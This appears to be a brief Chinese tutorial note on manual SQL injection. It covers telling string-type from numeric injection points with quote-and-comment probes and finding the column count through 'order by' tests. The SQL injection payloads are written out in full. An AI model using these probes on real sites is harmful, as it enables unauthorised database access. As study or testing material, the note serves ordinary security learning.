1.注入点判断
若在GET请求中?id=1 and 1=1和?id=1 and 1=2都没有报错，**则是字符型注入**。
字符型注入
```sql
?id=1' and '1'='1 -- -  #页面运行正常
?id=1' and '1'='2 -- -  #页面运行不正常
```
若在GET请求中?id=1 and 1=1没有报错，但是?id=1 and 1=2有异常或没回显，则是**数字型注入**
**2.查询字段**
rder by查询的是改数据表的字段数量
**访问id=1' order by 3结果与id=1结果相同，访问id=1' order by 4结果与id=1结果不相同**
结论**：字段数为3**
